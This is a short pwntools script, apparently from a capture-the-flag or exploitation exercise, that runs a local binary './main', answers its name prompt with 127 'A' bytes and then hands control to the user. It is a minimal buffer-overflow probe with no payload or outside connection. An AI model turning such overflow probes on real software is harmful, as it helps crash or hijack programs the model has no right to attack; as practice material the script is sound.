from pwn import * 

p = process("./main")

p.recvuntil(b"What's your name")

payload = b'A'*127

p.sendline(payload)
p.interactive()
